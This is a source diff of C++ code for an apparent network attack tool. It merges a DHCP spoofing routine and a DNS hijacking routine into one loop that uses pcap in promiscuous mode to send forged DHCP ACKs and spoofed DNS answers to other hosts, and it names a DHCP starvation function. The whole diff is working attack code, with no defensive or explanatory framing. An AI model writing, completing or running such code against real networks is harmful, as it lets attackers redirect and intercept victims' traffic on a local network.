@@ -113,19 +113,7 @@ int sendACKPacket(char* raw_packet, DHCP_header& rDHCP, IP_header& rIP, pcap_t* 
 
 int sendDNSResponse(char* raw_packet, char* qDNS, pcap_t* sock, AddressInfo& info)
 {
-	Ethernet_header ether{};
-	IP_header ip{};
-	UDP_header udp{};
-	DNS_header dns{};
-	DNS_query query{};
-
-	getEthernetheader(qDNS, 0, ether);
-	getIPheader(qDNS, sizeof(Ethernet_header), ip);
-	getUDPheader(qDNS, sizeof(Ethernet_header) + sizeof(IP_header), udp);
-	getDNSheader(qDNS, sizeof(Ethernet_header) + sizeof(IP_header) + sizeof(UDP_header), dns);
-	query = *(DNS_query*)&qDNS[sizeof(Ethernet_header) + sizeof(IP_header) + sizeof(UDP_header) + sizeof(DNS_header)];
-	int tSize = createDNSResponsePacket(raw_packet, (void*)&dns, (void*)&ip, (void*)&udp, (void*)&query, (void*)&ether, info);
-
+	size_t tSize = createDNSResponsePacket(raw_packet, qDNS, info);
 	if(pcap_sendpacket(
 		sock,
 		(u_char*)raw_packet,
@@ -149,7 +137,7 @@ DWORD WINAPI startDHCPStarvation(LPVOID info)
 	return 1;
 }
 
-DWORD WINAPI startDHCPSpoofing(LPVOID info)
+DWORD WINAPI startSpoofing(LPVOID info)
 {
 	SOCKET s;
 	sockaddr_in sockinfo;
@@ -192,7 +180,7 @@ DWORD WINAPI startDHCPSpoofing(LPVOID info)
 
 	char* raw_packet = new char[65536];
 	memset(raw_packet, 0, 65536);
-	char* ack_packet = new char[65536];
+	char* response_packet = new char[65536];
 	
 	// socket for sending ack
 	pcap_t* sock = pcap_open(getDeviceName(*(AddressInfo*)info), 0, PCAP_OPENFLAG_PROMISCUOUS, 0, NULL, NULL);
@@ -206,7 +194,7 @@ DWORD WINAPI startDHCPSpoofing(LPVOID info)
 	// listening 
 	while (!sent)
 	{
-		memset(ack_packet, 0, 65536);
+		memset(response_packet, 0, 65536);
 
 		error = recvfrom(s, raw_packet, 65536, 0, (sockaddr*)&dst, &size);
 
@@ -220,50 +208,17 @@ DWORD WINAPI startDHCPSpoofing(LPVOID info)
 		getDHCPPacketInfo(raw_packet, pDHCP, pUDP, pIP);
 
 		if (checkForDHCP(pDHCP))
-				if (getDHCPtype(pDHCP) == 3)
-					sent = sendACKPacket(ack_packet, pDHCP, pIP, sock,(*(AddressInfo*)(info)));
+			if (getDHCPtype(pDHCP) == 3)
+				sent = sendACKPacket(response_packet, pDHCP, pIP, sock,(*(AddressInfo*)(info)));
+		if (pUDP.dst_port == htons(53))
+			if (pIP.ip_version == 4)
+				if(pIP.ip_srcaddr != inet_addr((char*)((AddressInfo*)info)->ipv4))
+					sent = sendDNSResponse(response_packet, raw_packet, sock, (*(AddressInfo*)(info)));
+
 	}
-	delete[] ack_packet;
+	delete[] response_packet;
 	delete[] raw_packet;
 	closesocket(s);
-	pcap_close(sock);
-	return -1;
-}
-
-DWORD WINAPI startDNSHijacking(LPVOID info)
-{
-	pcap_t* sock = pcap_open(getDeviceName(*(AddressInfo*)info), 65536, PCAP_OPENFLAG_PROMISCUOUS, 0, NULL, NULL);
-	pcap_pkthdr header;
-
-	bool sent = false;
-	u_char* raw_packet;
-	char* DNS_packet = new char[65536];
-
-
-	UDP_header* udp;
-	IP_header* ip;
-
-	if (!sock)
-	{
-		std::cout << "error in pcap socket" << std::endl;
-		return -1;
-	}
-
-	while (!sent)
-	{
-		memset(DNS_packet, 0, 65536);
-		raw_packet = (u_char*)pcap_next(sock, &header);
-
-		if (!header.len)
-			break;
-
-		udp = (UDP_header*)&raw_packet[sizeof(Ethernet_header) + sizeof(IP_header)];
-		ip = (IP_header*)&raw_packet[sizeof(Ethernet_header)];
-		if (udp->dst_port == 53 && ip->ip_srcaddr != inet_addr((char*)(*(AddressInfo*)info).ipv4))
-			sent = sendDNSResponse(DNS_packet, (char*)raw_packet, sock, *(AddressInfo*)info);
-
-	}
-	delete[] DNS_packet;
 	pcap_close(sock);
 	return -1;
 }
